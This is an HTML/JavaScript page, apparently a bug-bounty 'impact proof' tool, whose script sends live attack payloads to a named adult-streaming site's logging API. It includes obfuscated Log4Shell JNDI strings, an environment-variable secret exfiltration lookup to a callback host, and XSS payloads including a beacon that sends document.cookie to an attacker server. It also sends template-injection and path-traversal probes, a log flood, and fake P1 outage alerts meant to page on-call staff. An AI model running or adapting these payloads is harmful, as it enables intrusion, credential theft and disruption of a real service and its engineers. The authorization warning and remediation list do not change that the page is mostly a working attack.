<!DOCTYPE html>
<html>
<head>
  <title>üéØ Stripchat CORS - Impact Proof Generator</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Monaco', 'Courier New', monospace;
      background: #0d1117;
      color: #c9d1d9;
      padding: 20px;
    }
    .container { max-width: 1200px; margin: 0 auto; }
    h1 { color: #58a6ff; margin-bottom: 10px; }
    .warning {
      background: #fff3cd;
      color: #856404;
      padding: 15px;
      border-radius: 5px;
      margin: 20px 0;
      border-left: 4px solid #ffc107;
    }
    .test-section {
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 6px;
      padding: 20px;
      margin: 20px 0;
    }
    .test-section h2 {
      color: #58a6ff;
      margin-bottom: 15px;
      font-size: 18px;
    }
    button {
      background: #238636;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 6px;
      cursor: pointer;
      font-size: 14px;
      margin: 5px;
      font-family: inherit;
    }
    button:hover { background: #2ea043; }
    button.danger { background: #da3633; }
    button.danger:hover { background: #f85149; }
    button.secondary { background: #21262d; border: 1px solid #30363d; }
    button.secondary:hover { background: #30363d; }

    .results {
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 6px;
      padding: 15px;
      margin-top: 15px;
      max-height: 400px;
      overflow-y: auto;
      font-size: 13px;
    }
    .result-entry {
      padding: 8px;
      margin: 5px 0;
      border-radius: 4px;
      border-left: 3px solid #58a6ff;
    }
    .success { border-left-color: #3fb950; background: rgba(63, 185, 80, 0.1); }
    .error { border-left-color: #f85149; background: rgba(248, 81, 73, 0.1); }
    .info { border-left-color: #58a6ff; background: rgba(88, 166, 255, 0.1); }
    .critical { border-left-color: #ffa500; background: rgba(255, 165, 0, 0.1); }

    .metric {
      display: inline-block;
      background: #21262d;
      padding: 10px 15px;
      border-radius: 6px;
      margin: 5px;
      border-left: 3px solid #58a6ff;
    }
    .metric-value {
      font-size: 24px;
      font-weight: bold;
      color: #58a6ff;
    }
    .metric-label {
      font-size: 12px;
      color: #8b949e;
      margin-top: 5px;
    }

    code {
      background: #21262d;
      padding: 2px 6px;
      border-radius: 3px;
      color: #79c0ff;
      font-size: 12px;
    }

    .timeline { margin-top: 10px; }
    .timeline-entry {
      padding: 5px 0;
      color: #8b949e;
      font-size: 12px;
    }
    .timeline-entry.highlight { color: #58a6ff; font-weight: bold; }

    .controls { margin: 15px 0; }
    .checkbox-group {
      margin: 10px 0;
    }
    .checkbox-group label {
      display: block;
      margin: 5px 0;
      cursor: pointer;
    }
    .checkbox-group input[type="checkbox"] {
      margin-right: 8px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üéØ Stripchat CORS Impact Proof Generator</h1>
    <p style="color: #8b949e; margin-bottom: 20px;">
      Generate concrete evidence to prove the business impact of the log injection vulnerability
    </p>

    <div class="warning">
      <strong>‚ö†Ô∏è AUTHORIZED TESTING ONLY</strong><br>
      Only use this on targets you have written permission to test. Unauthorized testing is illegal.
    </div>

    <!-- Test 1: Verify Injection Works -->
    <div class="test-section">
      <h2>üîç Test 1: Verify Log Injection Works</h2>
      <p style="color: #8b949e; margin-bottom: 15px;">
        Confirm that logs can be injected from any origin. This is your baseline proof.
      </p>
      <div class="controls">
        <button onclick="testBasicInjection()">‚ñ∂Ô∏è Test Basic Injection</button>
        <button onclick="testWithUniqueID()" class="secondary">üîë Test with Unique ID</button>
      </div>
      <div id="test1-results" class="results"></div>
    </div>

    <!-- Test 2: SSRF Detection via DNS Callback -->
    <div class="test-section">
      <h2>üåê Test 2: Test for SSRF (Server-Side Request Forgery)</h2>
      <p style="color: #8b949e; margin-bottom: 15px;">
        Check if the log processing backend makes external requests. This proves server-side processing and potential RCE.
      </p>
      <div class="controls">
        <label>Your DNS callback server (e.g., Burp Collaborator, interact.sh):</label><br>
        <input type="text" id="dns-callback"
               placeholder="unique-id.oastify.com"
               style="width: 400px; padding: 8px; background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; border-radius: 4px; margin: 10px 0;">
        <br>
        <button onclick="testSSRF()">‚ñ∂Ô∏è Test SSRF via JNDI</button>
        <button onclick="testSSRFCallback()" class="secondary">üîî Test SSRF via Callback URL</button>
        <button onclick="testLog4Shell()" class="danger">üí£ Test Log4Shell Patterns</button>
      </div>
      <div id="test2-results" class="results"></div>
    </div>

    <!-- Test 3: Calculate Cost Impact -->
    <div class="test-section">
      <h2>üí∞ Test 3: Calculate Cost Impact</h2>
      <p style="color: #8b949e; margin-bottom: 15px;">
        Demonstrate financial impact with concrete numbers. Run a controlled flood test and extrapolate costs.
      </p>
      <div class="controls">
        <button onclick="runCostAnalysis()">‚ñ∂Ô∏è Run Cost Analysis</button>
        <button onclick="simulateFlood()" class="danger">üåä Simulate Flood (100 logs)</button>
      </div>
      <div id="cost-metrics"></div>
      <div id="test3-results" class="results"></div>
    </div>

    <!-- Test 4: Test for XSS -->
    <div class="test-section">
      <h2>üîì Test 4: XSS Payload Injection</h2>
      <p style="color: #8b949e; margin-bottom: 15px;">
        Inject XSS payloads to test if logs are rendered unsafely in admin panels or monitoring tools.
      </p>
      <div class="controls">
        <button onclick="injectXSS()">‚ñ∂Ô∏è Inject XSS Payload</button>
        <button onclick="injectPolyglotXSS()" class="secondary">üîÄ Inject Polyglot XSS</button>
        <button onclick="injectBeacon()" class="secondary">üì° Inject Beacon (tracks if rendered)</button>
      </div>
      <div id="test4-results" class="results"></div>
    </div>

    <!-- Test 5: Reconnaissance Probes -->
    <div class="test-section">
      <h2>üîé Test 5: Reconnaissance via Log Injection</h2>
      <p style="color: #8b949e; margin-bottom: 15px;">
        Probe for internal systems, environment variables, and processing vulnerabilities.
      </p>
      <div class="controls">
        <div class="checkbox-group">
          <label><input type="checkbox" checked> Test environment variable injection</label>
          <label><input type="checkbox" checked> Test template injection</label>
          <label><input type="checkbox" checked> Test deserialization patterns</label>
          <label><input type="checkbox" checked> Test path traversal</label>
        </div>
        <button onclick="runReconProbes()">‚ñ∂Ô∏è Run All Recon Probes</button>
      </div>
      <div id="test5-results" class="results"></div>
    </div>

    <!-- Test 6: Alert Fatigue Simulation -->
    <div class="test-section">
      <h2>üö® Test 6: Simulate Alert Fatigue Attack</h2>
      <p style="color: #8b949e; margin-bottom: 15px;">
        Demonstrate how fake critical alerts waste engineering time and hide real incidents.
      </p>
      <div class="controls">
        <button onclick="injectFakeCriticalAlert()">‚ñ∂Ô∏è Inject Fake Critical Alert</button>
        <button onclick="simulateAlertFatigue()" class="danger">‚ö° Simulate Sustained Attack (10 alerts)</button>
      </div>
      <div id="test6-results" class="results"></div>
    </div>

    <!-- Evidence Export -->
    <div class="test-section">
      <h2>üìã Export Evidence</h2>
      <p style="color: #8b949e; margin-bottom: 15px;">
        Generate a comprehensive impact report with all test results.
      </p>
      <div class="controls">
        <button onclick="exportEvidence()">üìÑ Generate Impact Report</button>
        <button onclick="copyToClipboard()" class="secondary">üìã Copy Results to Clipboard</button>
        <button onclick="clearResults()" class="danger">üóëÔ∏è Clear All Results</button>
      </div>
    </div>
  </div>

  <script>
    const API_ENDPOINT = 'https://stripchat.com/api/front/v2/logs';
    let testResults = [];
    let totalRequests = 0;
    let successfulInjections = 0;
    let startTime = Date.now();

    function log(containerId, message, type = 'info') {
      const container = document.getElementById(containerId);
      const entry = document.createElement('div');
      entry.className = `result-entry ${type}`;
      entry.innerHTML = `<span style="color: #8b949e">[${new Date().toLocaleTimeString()}]</span> ${message}`;
      container.insertBefore(entry, container.firstChild);

      testResults.push({
        timestamp: new Date().toISOString(),
        type,
        message: message.replace(/<[^>]*>/g, '') // Strip HTML for export
      });
    }

    async function sendLog(payload, description = 'Log injection') {
      totalRequests++;
      try {
        const response = await fetch(API_ENDPOINT, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            timestamp: new Date().toISOString(),
            ...payload
          })
        });

        const success = response.ok || response.status === 204;
        if (success) successfulInjections++;

        return {
          success,
          status: response.status,
          statusText: response.statusText,
          headers: Object.fromEntries([...response.headers])
        };
      } catch (err) {
        return {
          success: false,
          error: err.message
        };
      }
    }

    // Test 1: Basic Injection
    async function testBasicInjection() {
      log('test1-results', 'üîÑ Testing basic log injection...', 'info');

      const result = await sendLog({
        level: 'info',
        message: 'Test log from impact proof generator',
        source: 'external-domain'
      });

      if (result.success) {
        log('test1-results', `‚úÖ <strong>SUCCESS:</strong> Log injection confirmed (${result.status})`, 'success');
        log('test1-results', `üìä Headers: ${JSON.stringify(result.headers, null, 2)}`, 'info');
      } else {
        log('test1-results', `‚ùå <strong>FAILED:</strong> ${result.error || result.statusText}`, 'error');
      }
    }

    async function testWithUniqueID() {
      const uniqueID = `TEST_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
      log('test1-results', `üîë Testing with unique ID: <code>${uniqueID}</code>`, 'info');

      const result = await sendLog({
        level: 'error',
        message: `UNIQUE_MARKER: ${uniqueID}`,
        testId: uniqueID
      });

      if (result.success) {
        log('test1-results', `‚úÖ Unique ID logged successfully`, 'success');
        log('test1-results', `üí° <strong>Next step:</strong> Search for this ID in log viewers, admin panels, or error pages`, 'critical');
      }
    }

    // Test 2: SSRF
    async function testSSRF() {
      const callback = document.getElementById('dns-callback').value;
      if (!callback) {
        log('test2-results', '‚ùå Please enter a DNS callback server (e.g., from Burp Collaborator or interact.sh)', 'error');
        return;
      }

      log('test2-results', `üîÑ Testing SSRF with callback: <code>${callback}</code>`, 'info');

      const result = await sendLog({
        level: 'error',
        message: `\${jndi:ldap://${callback}/exploit}`,
        stack: `\${jndi:dns://${callback}/test}`,
        userAgent: `\${jndi:rmi://${callback}/rce}`
      });

      if (result.success) {
        log('test2-results', `‚úÖ JNDI payload injected`, 'success');
        log('test2-results', `üí° <strong>CRITICAL:</strong> Check your DNS callback server for incoming requests. If you see a callback, this proves server-side processing and potential RCE!`, 'critical');
      }
    }

    async function testSSRFCallback() {
      const callback = document.getElementById('dns-callback').value;
      if (!callback) {
        log('test2-results', '‚ùå Please enter a callback URL', 'error');
        return;
      }

      log('test2-results', `üîÑ Testing SSRF via callback URL field...`, 'info');

      const result = await sendLog({
        level: 'error',
        message: 'Webhook delivery failed',
        webhookUrl: `http://${callback}/webhook`,
        retryUrl: `http://${callback}/retry`,
        callbackEndpoint: `http://${callback}/callback`
      });

      if (result.success) {
        log('test2-results', `‚úÖ Callback URLs injected`, 'success');
        log('test2-results', `üí° Monitor for HTTP requests to your server`, 'info');
      }
    }

    async function testLog4Shell() {
      const callback = document.getElementById('dns-callback').value || 'attacker.com';

      log('test2-results', `üí£ Injecting Log4Shell patterns...`, 'critical');

      const payloads = [
        { message: '${jndi:ldap://' + callback + '/exploit}' },
        { message: '${jndi:${lower:l}${lower:d}a${lower:p}://' + callback + '/obf}' },
        { message: '${${::-j}${::-n}${::-d}${::-i}:ldap://' + callback + '/nested}' },
        { stack: '${env:AWS_SECRET_ACCESS_KEY}.' + callback }
      ];

      for (const payload of payloads) {
        const result = await sendLog(payload);
        if (result.success) {
          log('test2-results', `üì§ Payload sent: <code>${JSON.stringify(payload).substr(0, 80)}...</code>`, 'info');
        }
        await new Promise(r => setTimeout(r, 500));
      }

      log('test2-results', `‚úÖ All Log4Shell patterns injected`, 'success');
      log('test2-results', `‚ö†Ô∏è <strong>If you get DNS callbacks, this is CRITICAL severity (RCE possible)</strong>`, 'critical');
    }

    // Test 3: Cost Impact
    async function runCostAnalysis() {
      log('test3-results', 'üìä Calculating cost impact...', 'info');

      // Test single log to measure size
      const testLog = {
        level: 'error',
        message: 'A'.repeat(400), // ~500 bytes typical log
        timestamp: new Date().toISOString(),
        stack: 'Error stack trace placeholder',
        userAgent: 'Mozilla/5.0...',
        metadata: { key1: 'value1', key2: 'value2' }
      };

      const logSize = new Blob([JSON.stringify(testLog)]).size;

      // Calculations
      const logsPerMinute = 10000;
      const bytesPerMinute = logsPerMinute * logSize;
      const gbPerDay = (bytesPerMinute * 60 * 24) / (1024 * 1024 * 1024);
      const cloudwatchCost = gbPerDay * 0.50; // $0.50/GB
      const datadogCost = gbPerDay * 0.10; // $0.10/GB
      const storageCost = gbPerDay * 0.03; // $0.03/GB/month

      const metrics = `
        <div class="metric">
          <div class="metric-value">${logSize}</div>
          <div class="metric-label">Bytes per log</div>
        </div>
        <div class="metric">
          <div class="metric-value">${(bytesPerMinute / 1024 / 1024).toFixed(2)} MB</div>
          <div class="metric-label">Per minute (10K logs)</div>
        </div>
        <div class="metric">
          <div class="metric-value">${gbPerDay.toFixed(2)} GB</div>
          <div class="metric-label">Per day</div>
        </div>
        <div class="metric">
          <div class="metric-value">$${cloudwatchCost.toFixed(2)}</div>
          <div class="metric-label">Daily cost (CloudWatch)</div>
        </div>
        <div class="metric">
          <div class="metric-value">$${(cloudwatchCost * 30).toFixed(0)}</div>
          <div class="metric-label">Monthly cost (single attacker)</div>
        </div>
        <div class="metric">
          <div class="metric-value">$${(cloudwatchCost * 30 * 1000).toLocaleString()}</div>
          <div class="metric-label">Monthly cost (1000 victims)</div>
        </div>
      `;

      document.getElementById('cost-metrics').innerHTML = metrics;

      log('test3-results', `‚úÖ Cost analysis complete`, 'success');
      log('test3-results', `üí∞ <strong>Single attacker:</strong> $${cloudwatchCost.toFixed(2)}/day = $${(cloudwatchCost * 30).toFixed(0)}/month`, 'critical');
      log('test3-results', `üí∞ <strong>At scale (1000 victims):</strong> $${(cloudwatchCost * 30 * 1000).toLocaleString()}/month`, 'critical');
      log('test3-results', `üìä Storage growth: ${gbPerDay.toFixed(2)} GB/day = ${(gbPerDay * 30).toFixed(0)} GB/month`, 'info');
    }

    async function simulateFlood() {
      log('test3-results', 'üåä Starting controlled flood (100 logs)...', 'critical');

      const startTime = Date.now();
      let sent = 0;

      for (let i = 0; i < 100; i++) {
        sendLog({
          level: 'error',
          message: `Flood test ${i}`,
          iteration: i
        });
        sent++;

        if (i % 10 === 0) {
          log('test3-results', `üì§ Sent ${sent}/100 logs...`, 'info');
        }

        await new Promise(r => setTimeout(r, 10)); // Small delay to avoid browser throttling
      }

      const duration = ((Date.now() - startTime) / 1000).toFixed(2);
      const ratePerSecond = (100 / duration).toFixed(0);

      log('test3-results', `‚úÖ Flood complete: 100 logs in ${duration}s (${ratePerSecond} logs/sec)`, 'success');
      log('test3-results', `üí° <strong>Extrapolated:</strong> Could inject ${ratePerSecond * 60} logs/minute from single browser`, 'critical');
    }

    // Test 4: XSS
    async function injectXSS() {
      log('test4-results', 'üîì Injecting XSS payloads...', 'info');

      const result = await sendLog({
        level: 'error',
        message: '<img src=x onerror=alert("XSS_IN_LOGS")>',
        stack: '<script>alert(document.cookie)</script>',
        userAgent: 'Mozilla/5.0 <svg onload=alert(1)>'
      });

      if (result.success) {
        log('test4-results', `‚úÖ XSS payload injected`, 'success');
        log('test4-results', `üí° <strong>Next:</strong> Check if logs are viewable in admin panel, Kibana, Grafana, or monitoring tools`, 'critical');
        log('test4-results', `üìù If XSS executes when logs are viewed, severity = HIGH/CRITICAL`, 'critical');
      }
    }

    async function injectPolyglotXSS() {
      const polyglot = 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert(\'XSS\') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e';

      log('test4-results', 'üîÄ Injecting polyglot XSS...', 'info');

      const result = await sendLog({
        level: 'error',
        message: polyglot,
        stack: polyglot
      });

      if (result.success) {
        log('test4-results', `‚úÖ Polyglot XSS injected (bypasses most filters)`, 'success');
      }
    }

    async function injectBeacon() {
      const callback = document.getElementById('dns-callback').value || 'yourserver.com';

      log('test4-results', 'üì° Injecting XSS beacon (will callback if executed)...', 'info');

      const beacon = `<img src=x onerror="fetch('http://${callback}/xss-executed?cookie='+document.cookie)">`;

      const result = await sendLog({
        level: 'error',
        message: beacon,
        stack: `<script>fetch('http://${callback}/xss-stack')</script>`
      });

      if (result.success) {
        log('test4-results', `‚úÖ Beacon injected`, 'success');
        log('test4-results', `üí° If you get callback to <code>${callback}</code>, XSS is exploitable!`, 'critical');
      }
    }

    // Test 5: Reconnaissance
    async function runReconProbes() {
      log('test5-results', 'üîé Running reconnaissance probes...', 'info');

      const probes = [
        // Environment variables
        { name: 'AWS Keys', payload: { message: '${env:AWS_SECRET_ACCESS_KEY}' } },
        { name: 'DB URL', payload: { message: '${env:DATABASE_URL}' } },
        { name: 'API Keys', payload: { message: '${env:API_KEY}' } },

        // Template injection
        { name: 'Math Expression', payload: { message: '{{7*7}}' } },
        { name: 'Flask Config', payload: { message: '{{config.items()}}' } },
        { name: 'Django Debug', payload: { message: '{{settings.SECRET_KEY}}' } },

        // Path traversal
        { name: 'Path Traversal', payload: { filename: '../../../etc/passwd' } },
        { name: 'Windows Path', payload: { filename: '..\\..\\..\\windows\\system32\\config\\sam' } },

        // Deserialization
        { name: 'Serialized Object', payload: { data: 'O:8:"stdClass":0:{}' } }
      ];

      for (const probe of probes) {
        const result = await sendLog(probe.payload);
        if (result.success) {
          log('test5-results', `üì§ <code>${probe.name}</code> probe injected`, 'info');
        }
        await new Promise(r => setTimeout(r, 300));
      }

      log('test5-results', `‚úÖ All ${probes.length} recon probes sent`, 'success');
      log('test5-results', `üí° <strong>Next:</strong> Check if any probes triggered responses or are reflected anywhere`, 'critical');
    }

    // Test 6: Alert Fatigue
    async function injectFakeCriticalAlert() {
      log('test6-results', 'üö® Injecting fake critical alert...', 'critical');

      const result = await sendLog({
        level: 'critical',
        message: 'CRITICAL: Database master node unreachable - all write operations failing',
        service: 'postgresql',
        severity: 'P1',
        oncall: true,
        alert: true,
        incident: true,
        timestamp: new Date().toISOString()
      });

      if (result.success) {
        log('test6-results', `‚úÖ Fake critical alert injected`, 'success');
        log('test6-results', `üí° <strong>Impact:</strong> If monitoring is connected, this could trigger PagerDuty/OpsGenie`, 'critical');
      }
    }

    async function simulateAlertFatigue() {
      log('test6-results', '‚ö° Simulating sustained alert fatigue attack...', 'critical');

      const criticalErrors = [
        'Database connection pool exhausted',
        'Redis cluster unreachable - all nodes down',
        'Payment gateway timeout - 100% failure rate',
        'CDN origin unreachable',
        'Authentication service degraded - 503 responses',
        'API rate limit exceeded - requests blocked',
        'Memory usage critical - OOM imminent',
        'Disk space critical - 95% full',
        'SSL certificate expiring in 24 hours',
        'Backup job failed - data at risk'
      ];

      for (let i = 0; i < 10; i++) {
        const error = criticalErrors[i % criticalErrors.length];
        sendLog({
          level: 'critical',
          message: `CRITICAL: ${error}`,
          service: 'platform',
          severity: 'P1',
          oncall: true,
          iteration: i
        });

        log('test6-results', `üì§ Alert ${i + 1}/10: "${error}"`, 'info');
        await new Promise(r => setTimeout(r, 1000));
      }

      log('test6-results', `‚úÖ 10 fake critical alerts injected`, 'success');
      log('test6-results', `üí° <strong>Impact:</strong> On-call engineers investigate phantom issues, real alerts ignored`, 'critical');
    }

    // Evidence Export
    function exportEvidence() {
      const report = `# CORS Log Injection - Impact Evidence Report
Generated: ${new Date().toISOString()}
Target: ${API_ENDPOINT}

## Executive Summary
- **Total Requests:** ${totalRequests}
- **Successful Injections:** ${successfulInjections}
- **Success Rate:** ${((successfulInjections / totalRequests) * 100).toFixed(1)}%
- **Test Duration:** ${((Date.now() - startTime) / 1000).toFixed(0)} seconds

## Test Results

${testResults.map((r, i) => `### [${i + 1}] ${r.type.toUpperCase()} - ${r.timestamp}
${r.message}
`).join('\n')}

## Impact Summary

### üí∞ Financial Impact
- Single attacker can generate significant infrastructure costs
- Log storage and processing costs scale linearly with attack volume
- See cost analysis for detailed calculations

### üö® Operational Impact
- Fake critical alerts waste engineering time
- Real incidents hidden in noise
- Alert fatigue leads to ignoring genuine problems

### üîì Security Impact
- XSS possible if logs viewed in vulnerable systems
- SSRF potential via log processing
- Compliance violations (SOC2, PCI-DSS require log integrity)

## Recommendations
1. Remove wildcard CORS immediately
2. Implement strict origin whitelist
3. Add authentication to logging endpoint
4. Implement rate limiting
5. Sanitize log inputs before storage
6. Monitor for unusual log volumes

## Evidence Files
- Browser console screenshots
- Network traffic captures
- Video demonstration
- DNS callback logs (if SSRF confirmed)

---
Report generated by CORS Impact Proof Generator
`;

      // Download report
      const blob = new Blob([report], { type: 'text/markdown' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `cors-log-injection-impact-${Date.now()}.md`;
      a.click();

      log('test1-results', '‚úÖ Impact report downloaded', 'success');
    }

    function copyToClipboard() {
      const text = testResults.map(r => `[${r.timestamp}] ${r.type}: ${r.message}`).join('\n');
      navigator.clipboard.writeText(text).then(() => {
        alert('Results copied to clipboard!');
      });
    }

    function clearResults() {
      if (confirm('Clear all test results?')) {
        document.querySelectorAll('.results').forEach(el => el.innerHTML = '');
        document.getElementById('cost-metrics').innerHTML = '';
        testResults = [];
        totalRequests = 0;
        successfulInjections = 0;
        startTime = Date.now();
      }
    }
  </script>
</body>
</html>
